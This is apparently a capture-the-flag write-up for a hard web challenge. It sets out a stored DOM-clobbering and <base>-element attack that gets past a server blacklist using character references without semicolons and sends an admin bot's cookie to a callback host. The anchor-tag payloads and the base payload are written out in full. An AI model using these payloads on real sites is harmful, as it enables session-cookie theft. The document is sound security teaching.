# whatsNew

> Spoiler warning: This document contains the analysis and complete solution.

## Overview

| Field | Value |
|---|---|
| Status | solved |
| Event or platform | K17 CTF 2026 / noCTF |
| Category | web |
| Difficulty | hard |
| Points | Dynamic scoring (168 in the supplied challenge screenshot) |
| Flag format | `K17{...}` |

Stored HTML can be placed in a post `description`, but a large string blacklist and a 200-character limit protect the sink. Splitting the payload across the latest posts in three categories and combining semicolonless numeric character references with DOM clobbering replaces the admin page's configuration object with an attacker-created `HTMLCollection`. A `<base>` element then changes URL resolution so the admin bot sends its cookie to the callback server.

## Environment and Initial Analysis

The official input is [handout.zip](../challenge/handout.zip), whose SHA-256 is `583B3EFDF428E5E93157EB1313EB08F44CF0DBFF21CF0125E42110FFC2E66C8C`. The extracted Node.js/Express source is preserved under [challenge/whatsNew](../challenge/whatsNew). The shared Python environment is restored from [requirements.txt](../../../requirements.txt); the final solver uses only the Python standard library and the system `ssh` executable.

`POST /category/:slug/new` passes only `description` through `decodeHtml()` and `isSuspicious()`. Each category's `renderPost()` nevertheless inserts that value through `raw()`. An unauthenticated `GET /admin/preview` returned HTTP 403, while `POST /report` asks an authenticated admin bot to visit `/admin/preview`.

Local behavior was verified with Python `3.12.10`, Node.js `24.20.0`, Chrome `153.0.8010.36`, and OpenSSH `9.5p2`. Exact request statuses and browser observations are recorded in [evidence.md](../analysis/evidence.md).

## Core Analysis

The regular expression in `decodeHtml()` recognizes only HTML character references ending in `;`. The server-side filter therefore does not read `w&#104atsNew` as `whatsNew`, but the browser HTML parser consumes `&#104` as `h` and produces the final `id` `whatsNew`. The same technique reconstructs blocked strings such as `m&#111de`, `p&#97nel`, and `&#35latest-posts` only in the browser.

The admin page renders the following six `<a>` elements from the combined latest posts. Each becomes `id=whatsNew` in the browser, and their `name` values become `mode`, `category`, `panel`, `label`, `autoReview`, and `next`. Window named access on the duplicate ID makes `window.whatsNew` a six-element `HTMLCollection`, whose named properties expose the corresponding anchors.

```html
<a id=w&#104atsNew name=m&#111de href=x></a>
<a id=w&#104atsNew name=c&#97tegory href=x></a>
<a id=w&#104atsNew name=p&#97nel href=&#35latest-posts></a>
<a id=w&#104atsNew name=l&#97bel href=x></a>
<a id=w&#104atsNew name=a&#117toReview href=1></a>
<a id=w&#104atsNew name=n&#101xt href=/&#97dmin/x></a>
```

The checks in `updates.js` now read `panel` as `#latest-posts`, `autoReview` as `1`, and `next.getAttribute('href')` as `/admin/x`. The third post supplies `<base href=&#47/CALLBACK_HOST/>`, which the browser interprets as `//CALLBACK_HOST/`. The raw `href` still starts with `/admin/`, but `next.href` is an absolute URL on the callback origin. The script finally adds `document.cookie` as the `cookie` query parameter and navigates there.

The three descriptions are 150 characters, 148 characters, and a short base payload determined by the callback hostname, so each remains below 200 characters. [poc.html](../analysis/poc.html) confirms the same navigation with the unmodified `updates.js`.

## Solution and Reproduction

[solve.py](../solve.py) reads the challenge URL and SSH tunnel endpoint from `instance.json`. It starts a local HTTP callback server and a disposable reverse tunnel, stores the three fragments in `tech`, `travel`, and `food`, and submits `/report`. It extracts `K17{...}` from the callback's `cookie` value and writes only the flag bytes to stdout.

Activate the competition `.venv` and run from the challenge root.

```bash
python -m pip install -r ../../requirements.txt
python -m pip check
python solve.py
```

If the remote instance is recreated, only `main.url` in [instance.json](../instance.json) needs to be changed.

## Result

The remote admin bot sent `token=K17%7BG4dg3t_D0M_Cl0663r1nggg%21%7D` to the callback. `python solve.py` exited with code 0, kept stderr empty, and produced the following stdout without a trailing newline; it matched the `flag` file byte for byte.

```text
K17{G4dg3t_D0M_Cl0663r1nggg!}
```

## Takeaways

A server-side string blacklist is bypassable when it does not model the browser's HTML entity parsing. Configuration read through named DOM properties is vulnerable to DOM clobbering even without direct JavaScript execution. When validation compares a raw attribute but navigation uses a resolved URL, a `<base>` element can invalidate the assumed trust boundary between those two representations.

## References

- [categoryRoutes.js](../challenge/whatsNew/src/routes/categoryRoutes.js): input processing and filter placement.
- [filter.js](../challenge/whatsNew/src/filter.js): entity decoder and blacklist behavior.
- [updates.js](../challenge/whatsNew/public/static/updates.js): DOM configuration consumption and cookie-bearing navigation.
- [adminRoutes.js](../challenge/whatsNew/src/routes/adminRoutes.js): admin bot authorization boundary.
- No external write-up was used.
